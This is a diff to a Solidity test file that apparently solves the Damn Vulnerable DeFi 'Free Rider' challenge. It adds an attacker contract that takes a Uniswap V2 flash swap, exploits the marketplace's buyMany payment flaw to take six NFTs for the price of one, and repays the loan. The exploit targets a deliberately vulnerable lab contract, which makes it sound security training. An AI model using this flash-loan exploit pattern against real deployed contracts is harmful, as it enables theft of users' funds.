@@ -151,6 +151,15 @@ contract FreeRider is Test {
         /** EXPLOIT START **/
         vm.startPrank(attacker, attacker);
 
+        FreeRiderAttacker freeAttacker = new FreeRiderAttacker(
+            uniswapV2Pair,
+            freeRiderNFTMarketplace,
+            damnValuableNFT,
+            payable(address(freeRiderBuyer))
+        );
+
+        freeAttacker.attack();
+
         vm.stopPrank();
         /** EXPLOIT END **/
         validation();
@@ -182,4 +191,68 @@ contract FreeRider is Test {
             MARKETPLACE_INITIAL_ETH_BALANCE
         );
     }
+}
+
+contract FreeRiderAttacker {
+    IUniswapV2Pair public pair;
+    FreeRiderNFTMarketplace public market;
+    DamnValuableNFT public nft;
+    address payable public buyer;
+
+    constructor(
+        IUniswapV2Pair pair_,
+        FreeRiderNFTMarketplace market_,
+        DamnValuableNFT nft_,
+        address payable buyer_
+    ) {
+        pair = pair_;
+        market = market_;
+        nft = nft_;
+        buyer = buyer_;
+    }
+
+    function attack() external {
+        bytes memory data = abi.encode(1);
+        pair.swap(0, 15e18, address(this), data);
+
+        payable(address(msg.sender)).transfer(address(this).balance);
+    }
+
+    function uniswapV2Call(
+        address,
+        uint256,
+        uint256,
+        bytes calldata
+    ) external {
+        WETH9 weth = WETH9(payable(pair.token1()));
+
+        uint256 repayAmount = (15e18 * 10031) / 10000;
+
+        weth.withdraw(15e18);
+
+        uint256[] memory ids = new uint256[](6);
+        for (uint256 i = 0; i < 6; i++) {
+            ids[i] = i;
+        }
+        market.buyMany{value: 15e18}(ids);
+
+        for (uint256 i = 0; i < 6; i++) {
+            nft.safeTransferFrom(address(this), buyer, i);
+        }
+
+        weth.deposit{value: repayAmount}();
+
+        weth.transfer(address(pair), repayAmount);
+    }
+
+    function onERC721Received(
+        address,
+        address,
+        uint256,
+        bytes memory
+    ) external pure returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+    receive() external payable {}
 }
